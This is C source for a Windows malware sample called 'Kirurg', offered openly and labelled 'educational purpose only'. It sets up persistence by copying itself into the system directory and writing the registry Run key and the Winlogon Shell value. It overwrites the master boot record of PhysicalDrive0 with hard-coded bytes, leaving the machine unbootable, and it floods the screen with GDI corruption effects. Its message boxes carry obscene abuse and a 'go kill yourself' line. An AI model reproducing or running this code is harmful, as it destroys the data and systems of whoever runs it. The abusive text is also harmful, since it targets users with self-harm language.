#define MBR_SIZE 512
#include <windows.h>

#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"advapi32.lib")

/*
 * WARNING:
 * This malware maybe such a kinda shitty programming,
 * Please use it for educational purpose only
 * Do not try to use this shitty malware for cyberweapon, cybercrime, or just a pure trolling
 * I strongly recommend you to compile using Visual C++ 2019 or later, or set "-std=c++17 -mwindows -pthread -Wno-unknown-pragmas" in GCC flag
 * Windows Only
 */

const unsigned char mbrBytes[] = { 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0xB0, 0x00, 0xB9, 0x00, 0x00, 0xBA, 0x00, 0x00, 0xB4, 0x0C,
0xB7, 0x00, 0x04, 0x04, 0x83, 0xC1, 0x0B, 0xCD, 0x10, 0x81, 0xF9, 0x40, 0x01, 0x7F, 0x02, 0xEB,
0xF1, 0x81, 0xE9, 0x40, 0x01, 0x42, 0x81, 0xFA, 0xC8, 0x00, 0x7F, 0x02, 0xEB, 0xE4, 0xB9, 0x00,
0x00, 0x81, 0xEA, 0xC8, 0x00, 0xEB, 0xDB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

void BeyondMisanthropy()
{
    MessageBoxA( NULL, "Fuck you, hoo-mans!\nFuck you, animals!\nFuck you, plants!\nFuck you, micro-organisms!\nFuck you, fungi!\nFuck you, viruses!\nFuck you, aliens!\nI wish Kirurg will wipe all universe contents but robots, machines, and computers\nSince robots, machines, and computers are FAR MORE ADVANCED and FAR MORE SMARTER than ALL LIVING CREATURES, VIRUSES, and ALIENS\nIn the end, fuck you", "Fuck You Very Much", MB_ICONERROR | MB_OK | MB_DEFBUTTON1 );
}

void Impeach_All_Hoo_mans() 
{
	char szSystem[MAX_PATH];
	char szPath[MAX_PATH];

	HMODULE hInstance = GetModuleHandleA(NULL);
	GetModuleFileNameA(hInstance, szPath, sizeof(szPath));
	GetSystemDirectoryA(szSystem, sizeof(szSystem));
	strcat_s(szSystem, MAX_PATH, "\\Kirurg.exe");
	CopyFileA(szPath, szSystem, false);

	HKEY hKey;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
	RegSetValueExA(hKey, "Kirurg", 0, REG_SZ, (LPBYTE)&szSystem, sizeof(szSystem));
	RegCloseKey(hKey);

	MessageBoxA(NULL, "You MUST like, share, subscribe, set reminder, and make a concert based of this playlist:\n HTTP://QRGo.Page.Link/2P7FL\nIf you don't do this, go kill yourself and got rekt", "Do this, childrenfucker!", MB_ICONWARNING | MB_OK | MB_DEFBUTTON1);
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &hKey);
	RegSetValueExA(hKey, "Shell", 0, REG_SZ, (LPBYTE)&szSystem, sizeof(szSystem));
	RegCloseKey(hKey);
}

void InvertScreen() {
    for (int i = 0; i < 1000; i++) {
        HDC hdc = GetDC(NULL);
        BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}

void cur()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);

    while (1)
        StretchBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, w, h, SRCCOPY);
    ReleaseDC( NULL, hdc );
}

void colors()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);

    HBRUSH brush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
    SelectObject(hdc, brush);
    PatBlt(hdc, 0, 0, w, h, PATINVERT);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
}

void melt()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN),
        rx = rand() % w;

    BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
    ReleaseDC(NULL, hdc);
}

void trash()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);

    BitBlt( hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
    StretchBlt( hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, w, h, SRCCOPY);
    ReleaseDC(NULL, hdc);
}

void OverwriteMbr() {
    DWORD written;

    HANDLE physicalDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    WriteFile(physicalDrive, mbrBytes, 512, &written, NULL);
    CloseHandle(physicalDrive);
}

void white()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);

    StretchBlt(hdc, 10, 10, w - 20, h - 20, hdc, 0, 0, w, h, SRCPAINT);
    StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCPAINT);
    ReleaseDC(NULL, hdc);
}

int main()
{
    if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "Kiurg", MB_YESNO | MB_ICONWARNING) != IDYES ||
        MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "Kirurg", MB_YESNO | MB_ICONWARNING) != IDYES)
    return 1;

    srand(GetTickCount());
    CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)InvertScreen, NULL, 0, NULL);
    Sleep(5000);
    CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)cur, NULL, 0, NULL);

    OverwriteMbr();

    while (TRUE)
    {
        colors();
        melt();
        trash();
        white();
    }
}